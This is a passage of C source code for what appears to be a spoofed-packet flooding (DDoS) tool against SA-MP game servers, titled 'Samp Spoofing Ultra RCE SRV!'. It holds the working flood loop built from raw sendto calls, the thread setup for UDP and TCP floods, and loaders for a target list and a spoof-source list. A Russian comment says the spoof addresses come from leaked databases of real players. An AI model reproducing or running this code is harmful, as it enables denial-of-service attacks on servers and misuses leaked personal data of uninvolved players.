		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));
		if (TypeGenIP == 0)
		{
			list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		}
		//////////////////////////////////////////////////////////////////////////////////////////////////
		if (type == 2) //всегда в самом низу
		{
			usleep(pps);
		}
    }
}

int main(int argc, char *argv[]) //https://youtu.be/fPO76Jlnz6c
{
	if(argc < 9)
	{
		fprintf(stderr, OBFUSCATE("\x1B[31m Samp Spoofing Ultra RCE SRV! \x1B[0m\n"));
		fprintf(stdout, OBFUSCATE("\x1B[32m Usage: %s <time> <password> <method 0-udp, 1-tcp> <dst port 0-not rand, 1-rand> <threads 1=legit, 2-100=rage> <ppslimit microseconds> <ppslimit type> <generate ip>  \x1B[0m\n"), argv[0]);
		fprintf(stderr, OBFUSCATE("\x1B[32m Usage: ppslimit microseconds -1 = no limit, 0-2000=rage, 3000-900000=legit \x1B[0m\n"));
		fprintf(stderr, OBFUSCATE("\x1B[32m Usage: ppslimit type -1 = no limit, 0 = legit1, 1 = legit2, 2 = rage \x1B[0m\n"));
		fprintf(stderr, OBFUSCATE("\x1B[32m Usage: generate ip 0 = list(ru/cis), 1 = rand(world) \x1B[0m\n"));
		fprintf(stderr, OBFUSCATE("\x1B[33m Developer AlexDrift \x1B[0m\n")); //всегда остаются первоначальными разработчиками, основа огрызок rvse
		exit(-1);
	}
	//printf("%s\n", GetKey(GetSerial())); //получаем сгенерированый ключ
	//SL->KeyCheck();
	//SL->IPCheck();
	SL->PassCheck(argv[2]);
	zalupa = US->convert(argv[3]);
	zalup = US->convert(argv[4]);
	srand(time(NULL)); 
	num_threads = atoi(argv[5]); //один поток блядь, для корректной отправки и последовательности трафика
	pps = atoi(argv[6]);
	type = atoi(argv[7]);
	TypeGenIP = atoi(argv[8]);
	int i = 0;
	head = NULL;
	int max_len = 8192;
	char *buffer = (char *)malloc(max_len);
	FILE *list_fd = fopen("hips.txt", "r"); //https://zaycev.net/pages/3187/318711.shtml?spa=true&trackId=318711
	while (fgets(buffer, max_len, list_fd) != NULL) 
	{
		if ((buffer[strlen(buffer) - 1] == '\n') ||
			(buffer[strlen(buffer) - 1] == '\r')) 
		{
			buffer[strlen(buffer) - 1] = 0x00;
			if (head == NULL)
			{
				dst_ip = strtok(buffer, ":");
				dst_port = atoi(strtok(NULL, ":"));
				head = (struct slist *)malloc(sizeof(struct slist));
				bzero(&head->datalist, sizeof(head->datalist));
				head->datalist.sin_addr.s_addr = inet_addr(dst_ip);
				head->datalist.sin_port = dst_port;
				head->snext = head;
				head->prev = head;
			}
			else 
			{
				dst_ip = strtok(buffer, ":");
				dst_port = atoi(strtok(NULL, ":"));
				struct slist *new_node = (struct slist *)malloc(sizeof(struct slist));
				memset(new_node, 0x00, sizeof(struct slist));
				new_node->datalist.sin_addr.s_addr = inet_addr(dst_ip);
				new_node->datalist.sin_port = dst_port;
				new_node->prev = head;
				new_node->snext = head->snext;
				head->snext = new_node;
			}
			i++;
		}
		else 
		{
			continue;
		}
	}
	struct slist* current = head->snext;
	//////////////////////////////////////////////////////////////////////
	int ebattogokonyavsraku = 0;
	ahead = NULL;
	int amax_len = 8192;
	char* abuffer = (char*)malloc(amax_len);
	FILE* alist_fd = fopen("aips.txt", "r"); //https://zaycev.net/pages/8218/821822.shtml?spa=false
	while (fgets(abuffer, amax_len, alist_fd) != NULL) 
	{
		if ((abuffer[strlen(abuffer) - 1] == '\n') ||
			(abuffer[strlen(abuffer) - 1] == '\r')) 
		{
			abuffer[strlen(abuffer) - 1] = 0x00;
			if (ahead == NULL)
			{
				ahead = (struct abuse_list*)malloc(sizeof(struct abuse_list));
				bzero(&ahead->adata, sizeof(ahead->adata));
				ahead->adata.sin_addr.s_addr = inet_addr(abuffer);
				ahead->anext = ahead;
				ahead->aprev = ahead;
			}
			else
			{
				struct abuse_list* new_node_abuse = (struct abuse_list*)malloc(sizeof(struct abuse_list));
				memset(new_node_abuse, 0x00, sizeof(struct abuse_list));
				new_node_abuse->adata.sin_addr.s_addr = inet_addr(abuffer);
				new_node_abuse->aprev = ahead;
				new_node_abuse->anext = ahead->anext;
				ahead->anext = new_node_abuse;
			}
			ebattogokonyavsraku++;
		}
		else
		{
			continue;
		}
	}
	struct abuse_list *acurrent = ahead->anext;
	///////////////////////////////////////////////////////////////////////
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = dst_port; //вы за поправки в конституцию?
	sin.sin_addr.s_addr = inet_addr(dst_ip); //нэээт!
	US->samp_relevance(dst_port); //брутим-брутим...
	struct thread_data Thread[num_threads];
	pthread_t thread[num_threads];
	if(zalupa == 0) //udp
	{
		for(i = 0; i <num_threads; i++) //ок...
		{
			Thread[i].thread_id = i;
			Thread[i].list_node = current;
			Thread[i].list_node_abuse = acurrent;
			pthread_create(&thread[i], NULL, &Flooding_UDP, (void *)&Thread[i]);
		}
	}
	struct thread_data_tcp Thread_tcp[num_threads];
	pthread_t thread_tcp[num_threads];
	if(zalupa == 1) //tcp
	{
		for(i = 0; i <num_threads; i++) //ок...
		{
			Thread_tcp[i].thread_id_tcp = i;
			Thread_tcp[i].list_node = current;
			Thread_tcp[i].list_node_abuse = acurrent;
			pthread_create(&thread_tcp[i], NULL, &Flooding_TCP, (void *)&Thread_tcp[i]);
		}
	}
	fprintf(stdout, OBFUSCATE("\x1B[31m Connecting to %s:%d... \x1B[0m\n"), dst_ip, dst_port); //https://zaycev.net/pages/39477/3947790.shtml?spa=false
	if(argc > 2)
	{
		sleep(atoi(argv[1]));
	} 
	else 
	{
		while(1)
		{
			sleep(1);
		}
	}
	return 0;
}

#pragma GCC diagnostic pop //всегда в самом низу